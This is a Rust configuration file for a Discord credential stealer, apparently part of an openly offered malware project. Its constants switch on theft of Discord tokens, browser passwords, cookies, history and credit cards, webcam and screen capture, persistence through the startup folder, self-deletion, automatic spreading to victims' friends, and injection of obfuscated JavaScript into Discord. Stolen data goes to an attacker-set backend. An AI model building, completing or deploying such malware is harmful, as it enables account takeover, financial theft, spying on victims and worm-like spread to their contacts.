// Sends new user token when they change user data also steals credit cards and login information
pub const TRACE_TOKEN: bool = false;

// Restarts discord after injecting code so they'll have to login instantly
pub const REFRESH_DISCORD: bool = false;

// Automatically spreads the stealer through victim's discord
pub const AUTO_SPREAD: bool = false;

// Message to send to victim's discord friends with the stealer
pub const AUTO_SPREAD_MESSAGE: String = String::new();

// Prevents the victim from visiting the specified sites
pub const SITE_BLOCKER: bool = false;

// Sites to be blocked e.g pornhub.com
pub const SITES_TO_BLOCK: &'static [&'static str] = &[];

// Self deletes after execution
pub const MELT: bool = false;

// Copies the stealer to %TEMP% and places to startup
pub const COPY_TO_TEMP: bool = false;

// Steals and decrypts discord tokens (self explanatory)
pub const STEAL_TOKENS: bool = true;

// Steals browser passwords (self explanatory)
pub const STEAL_PASSWORDS: bool = false;

// Steals browser cookies (self explanatory)
pub const STEAL_COOKIES: bool = false;

// Steal browsing history (self explanatory)
pub const STEAL_HISTORY: bool = false;

// Steal credit cards (self explanatory)
pub const STEAL_CREDIT_CARDS: bool = false;

// Takes a screenshot (self explanatory)
pub const SCREENSHOT: bool = false;

// Takes a webcam image (self explanatory)
pub const WEBCAM_IMAGE: bool = false;

// Change this to your backend
pub const BACKEND: &'static str = "[ENTER-BACKEND]";

// Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
